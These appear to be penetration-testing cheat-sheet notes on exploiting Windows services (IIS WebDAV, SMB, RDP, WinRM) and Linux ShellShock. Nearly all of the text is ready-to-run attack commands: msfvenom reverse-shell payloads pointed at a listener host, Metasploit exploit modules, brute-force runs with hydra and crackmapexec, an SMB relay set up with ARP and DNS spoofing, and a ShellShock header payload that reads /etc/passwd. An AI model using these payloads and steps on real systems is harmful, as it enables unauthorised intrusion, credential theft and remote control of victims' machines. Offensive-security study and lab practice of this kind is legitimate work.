# Summary

- [[Exploitation#Windows OS|Windows OS]]
	- [[Exploitation#IIS Server|IIS Server]]
	- [[Exploitation#SMB|SMB]]
	- [[Exploitation#RDP|RDP]]
	- [[Exploitation#WinRM|WinRM]]
- [[Exploitation#Linux OS|Linux OS]]
	- [[Exploitation#CVE-2014-6271 (ShellShock)|ShellShock]]



# Windows OS

## IIS Server

**Wonderful article**: https://medium.com/@ennoukhbadr/webdav-penetration-351d59ac9859

Supported **executable** file extensions :
- .asp
- .aspx
- .config
- .php

**Davtest** to check which extension can be executed on the server :
```bash
davtest -url 'http://<IP>/webdav/' -auth 'admin:password_123321'
```

**Cadaver** to connect, upload, remove, ... :
```bash
# Connect then use 'put' to upload a malicious file
cadaver http://<IP>/webdav/
```

Of course, we can use **Metasploit** : 
```bash
# For asp reverse shell :
use exploit/windows/iis/iis_webdav_upload_asp

# Set options :
set PATH /webdav/whatever.asp (IMPORTANT !)
set RHOSTS <IP>
set HttpUsername
set HttpPassword
```

### Microsoft FTP

If you can modify the website thanks to FTP, you can upload a `.asp` or `.aspx` file on the web server to gain a reverse shell.

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=1234 -f asp > shell.aspx
```

## SMB

Try to find valid credentials with bruteforcing `Administrator` account : 
```bash
# With Metasploit Module :
use auxiliary/scanner/smb/smb_login

set RHOSTS <IP>
set PASS_FILE /path/to/wordlist
set SMBUser Administrator
set STOP_ON_SUCCESS true
```

Then, create a malicious file (reverse shell) with **MSFvenom**: 
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.3 LPORT=1234 -f exe -o payload.exe
```

Upload your shell with **smbclient** and execute it with **psexec.py** :
```bash
psexec.py Administrator@10.2.20.249 "C:\Users\Administrator\Desktop\payload.exe"
```

You can also **pop a shell** with : 
```bash
# PSexec.py
psexec.py Administrator@10.2.20.249 cmd.exe

# Metasploit Module (Meterpreter Session !):
use exploit/windows/smb/psexec

set RHOSTS <IP>
set SMBUser Administrator
set SMBPass Password1 # You can also Pass The Hash !
```

### SMB Relay Attack

> An SMB relay attack is a type of network attack where an attacker
intercepts SMB (Server Message Block) traffic, manipulates it, and relays
it to a legitimate server to gain unauthorized access to resources or
perform malicious actions.

1. Configure SMB Relay Exploit :
```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST <YOUR-IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR-IP>
set SMBHOST <TARGET>
exploit
```

2. Configure **dnsspoof** in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain :
```
echo "<YOUR-IP> *.DOMAIN.TLD" > fake_dns.txt
```

3. Run **DnsSpoof** :
```
dnsspoof -i eth1 -f dns
```

4. Enable the IP forwarding : 
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

5. Start the **ARP Spoof attack** :
```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

6. Wait for connections.


## RDP

Sometimes RDP doesn't run on the default port, so check :
```bash
use auxiliary/scanner/rdp/rdp_scanner 
```

- Bruteforce :
```bash
hydra -L Administrator -P /opt/rockyou.txt 10.2.16.41 rdp -v -V
```

- Connection : 
```bash
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>[:PORT]
```


## WinRM

- Bruteforce :
```bash
# Metasploit Module
use auxiliary/scanner/winrm/winrm_login

set RHOSTS <IP>
set PASS_FILE 
set USER_FILE
set VERBOSE true/false

# CrackMapExec :
crackmapexec winrm <IP> -u Administrator -p /opt/rockyou.txt
```

- Connect to the target :
```bash
# Evil-WinRM :
evil-winrm.rb -i 10.2.21.115 -u Administrator -p password

# Metasploit Module :
use exploit/windows/winrm/winrm_script_exec

set RHOSTS <IP>
set USERNAME
set PASSWORD
set FORCE_VBS true 
```


# Linux OS


## CVE-2014-6271 (ShellShock)

### Description

>Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in
the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary
commands via Bash, consequently allowing the attacker to obtain remote
access to the target system via a reverse shell.

### Proof Of Concept

Links :
- https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html
- https://github.com/opsxcq/exploit-CVE-2014-6271


If you find a `.cgi` script on the web server, check if it is vulnerable to *ShellShock* with **NSE** :
```bash
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

Then, inject your payload in the `User-Agent:` field :
```bash
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```


You can also use **Metasploit** :
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOSTS <IP>
set TARGETURI /script.cgi
```


